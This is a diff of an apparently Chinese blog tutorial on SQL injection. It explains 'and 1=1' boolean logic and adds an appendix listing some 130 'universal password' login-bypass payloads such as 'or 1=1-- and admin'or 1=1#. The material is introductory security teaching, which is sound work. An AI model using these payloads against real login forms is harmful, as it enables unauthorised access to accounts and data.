@@ -475,14 +475,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    10 分
                 </div>
                 
 
@@ -854,11 +854,11 @@ mysql> select id,name from userinfo where id=1 and 1=1;
 mysql> select id,name from userinfo where id=1 and 1=2;
 Empty set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当使用语句 <code>select id,name from userinfo where id=1;</code> 时可以清楚的看到该语句执行成功了，当后面追加了 <code>and 1=1</code> 时，本身 <code>1=1</code> 就是真的，所以真与真得真，该语句可以执行成功且有结果；而当追加 <code>and 1=2</code> 时，本身 <code>1=2</code> 就是假的，那么真与假必定为假，所以没有得到输出结果。这里用一个图做直观的认知。</p>
-<img src="https://s1.ax1x.com/2020/05/12/YNOLid.png">
+<img src="https://s1.ax1x.com/2020/05/12/YNz2gs.png">
 
 <center>逻辑运算图——真</center>
 
-<img src="https://s1.ax1x.com/2020/05/12/YNObIH.png">
+<img src="https://s1.ax1x.com/2020/05/12/YNzRvn.png">
 
 <center>逻辑运算图——假</center>
 
@@ -867,15 +867,145 @@ Empty set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></s
 
 <center>详细讲解图</center>
 
+<p>其它还有很多万能密码在附录一中，就不一一解释了，只要能明白逻辑结构就行</p>
+<h2 id="三、常见的SQL注入类型浅析"><a href="#三、常见的SQL注入类型浅析" class="headerlink" title="三、常见的SQL注入类型浅析"></a>三、常见的SQL注入类型浅析</h2><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="附录一、万能密码字典"><a href="#附录一、万能密码字典" class="headerlink" title="附录一、万能密码字典"></a>附录一、万能密码字典</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">"or "</span>a<span class="token string">"="</span>a
+<span class="token string">'.).or.('</span>.a.<span class="token string">'='</span>.a 
+or 1<span class="token operator">=</span>1--
+<span class="token string">'or 1=1--
+a'</span>or<span class="token string">' 1=1--
+"or 1=1--
+'</span>or.<span class="token string">'a.'</span><span class="token operator">=</span><span class="token string">'a
+"or"="a'</span><span class="token operator">=</span><span class="token string">'a
+'</span>or<span class="token string">''</span><span class="token operator">=</span><span class="token string">'
+'</span>or<span class="token string">'='</span>or<span class="token string">'
+admin'</span>or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span>
+admin<span class="token string">'/*
+aaaa*/'</span>
+<span class="token string">'or 1=1/*
+"or "a"="a
+"or 1=1--
+"or"="
+"or"="a'</span><span class="token operator">=</span><span class="token string">'a
+"or1=1--
+"or=or"
+'</span><span class="token string">'or'</span><span class="token operator">=</span><span class="token string">'or'</span>
+<span class="token string">') or ('</span>a<span class="token string">'='</span>a
+<span class="token string">'.).or.('</span>.a.<span class="token string">'='</span>.a
+<span class="token string">'or 1=1
+'</span>or 1<span class="token operator">=</span>1--
+<span class="token string">'or 1=1/*
+'</span>or<span class="token string">"="</span>a<span class="token string">'='</span>a
+<span class="token string">'or'</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span>
+<span class="token string">'or'</span><span class="token string">'='</span>
+<span class="token string">'or'</span><span class="token string">'='</span><span class="token string">'or'</span><span class="token string">'='</span>
+<span class="token string">'or'</span><span class="token operator">=</span><span class="token string">'1'</span>
+<span class="token string">'or'</span><span class="token operator">=</span><span class="token string">'or'</span>
+<span class="token string">'or.'</span>a.<span class="token string">'='</span>a
+<span class="token string">'or1=1--
+1'</span>or<span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1
+a'</span>or<span class="token string">' 1=1--
+a'</span>or<span class="token string">'1=1--
+or '</span>a<span class="token string">'='</span>a<span class="token string">'
+or 1=1--
+or1=1--
+"or "a"="a
+ '</span><span class="token punctuation">)</span>or<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token string">'a
+or 1=1–
+'</span>or 1<span class="token operator">=</span>1–
+a<span class="token string">'or'</span> 1<span class="token operator">=</span>1–
+<span class="token string">"or 1=1–
+'or'a'='a
+"</span>or<span class="token string">"="</span>a<span class="token string">'='</span>a
+<span class="token string">'or"='</span>
+<span class="token string">'or'</span><span class="token operator">=</span><span class="token string">'or'</span>
+1 or <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">=</span>1
+1 or <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1′ or 1=1
+'</span>OR 1<span class="token operator">=</span>1%00
+"or 1<span class="token operator">=</span>1%00
+<span class="token string">'xor
+admin'</span> or <span class="token string">'a'</span><span class="token operator">=</span><span class="token string">'a
+'</span>or 1<span class="token operator">=</span>1/*
+something
+<span class="token string">'OR '</span>1<span class="token string">'='</span>1
+1<span class="token string">'or'</span>1<span class="token string">'='</span>
+admin<span class="token string">' OR 1=1/*
+'</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'=0#
+'</span><span class="token operator">></span>-1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;1#
+1'</span><span class="token operator">&lt;</span>99<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'=0=1#
+'</span><span class="token operator">&lt;=</span><span class="token operator">></span>0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'=0=1=1=1=1=1#
+'</span><span class="token operator">=</span>1<span class="token operator">&lt;</span><span class="token operator">></span>1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;>1#
+1'</span><span class="token operator">&lt;</span><span class="token operator">></span>99999<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'!=2!=3!=4#
+'</span><span class="token operator">|</span>0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&amp;0#
+'</span>^0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;&lt;0#
+'</span><span class="token operator">>></span>0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&amp;'</span><span class="token string">'#
+'</span>%11<span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&amp;1&amp;1#
+'</span><span class="token operator">|</span>0<span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;&lt;0|0#
+'</span><span class="token operator">&lt;&lt;</span>0<span class="token operator">>></span>0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'*9#
+'</span>/9<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'%9#
+'</span>+0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'-0#
+'</span>+2+5-7<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'+0+0-0#
+'</span>-0-0-0-0-0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'*9*8*7*6*5#
+'</span>/2/3/4<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'%12%34%56%78#
+'</span>/**/+/**/0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'-----0#
+'</span>+++0+++++0*0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;hex(1)#
+'</span><span class="token operator">=</span>left<span class="token punctuation">(</span>0x30,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'=right(0,1)#
+'</span><span class="token operator">!=</span>curdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'-reverse(0)#
+'</span><span class="token operator">=</span>ltrim<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;abs(1)#
+'</span>*round<span class="token punctuation">(</span>1,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&amp;left(0,0)#
+'</span>*round<span class="token punctuation">(</span>0,1<span class="token punctuation">)</span>*round<span class="token punctuation">(</span>0,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'=upper     (0)#
+'</span> <span class="token operator">&lt;</span>1 and 1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'xor 1#
+'</span>div 1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'is not null#
+admin'</span> order by<span class="token string">'
+admin'</span> group by<span class="token string">'
+'</span>like 0<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'between 1 and 1#
+'</span>regexp 1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'='</span>
+<span class="token string">'&lt;>'</span>1
+<span class="token string">'>1='</span>
+0<span class="token string">'='</span>0
+<span class="token string">'&lt;1 and 1>'</span>
+<span class="token string">'&lt;>ifnull(1,2)='</span>1
+<span class="token string">'=round(0,1)='</span>1
+<span class="token string">'*0*'</span>
+<span class="token string">'+'</span>
+<span class="token string">'-'</span>
+<span class="token string">'+1-1-'</span>
+<span class="token string">'+(0-0)#
+'</span><span class="token operator">=</span>0<span class="token operator">&lt;</span><span class="token operator">></span><span class="token variable"><span class="token punctuation">((</span>reverse<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span></span>-<span class="token punctuation">(</span>reverse<span class="token punctuation">(</span>1<span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+<span class="token string">'&lt;(8*7)*(6*5)*(4*3)#
+'</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>1+1<span class="token punctuation">)</span>-2<span class="token comment" spellcheck="true">#</span>
+<span class="token string">'>(0-100)#
+'</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span>
+<span class="token string">' or '</span>
+<span class="token string">' || '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-
-
-
-
-
-<h2 id="三、常见的SQL注入类型浅析"><a href="#三、常见的SQL注入类型浅析" class="headerlink" title="三、常见的SQL注入类型浅析"></a>三、常见的SQL注入类型浅析</h2>
             </div>
             <hr/>
 
@@ -1493,7 +1623,7 @@ Empty set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">48.7k</span>&nbsp;字
+                class="white-color">49.1k</span>&nbsp;字
             
             
             
